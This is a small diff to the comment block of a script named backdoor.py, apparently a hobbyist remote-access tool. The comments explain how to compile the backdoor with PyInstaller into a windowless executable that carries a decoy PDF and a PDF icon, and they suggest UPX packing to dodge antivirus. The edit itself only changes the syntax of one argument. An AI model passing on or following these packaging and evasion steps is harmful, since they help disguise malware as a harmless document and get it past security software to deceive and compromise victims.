@@ -94,4 +94,4 @@ except Exception:
 
 # This dosen't bypass the antivirus u can do it by using upx and compressing .exe file
 # Package this script into an executable file with PyInstaller and make sure to be packaged in windows computer
-# Pyinstaller.exe --add-data “location\\sample.pdf, . ” -—onefile -—nonconsole --icon pdf.ico backdoor.py
+# Pyinstaller.exe --add-data=location\\sample.pdf: .  -—onefile -—nonconsole --icon pdf.ico backdoor.py
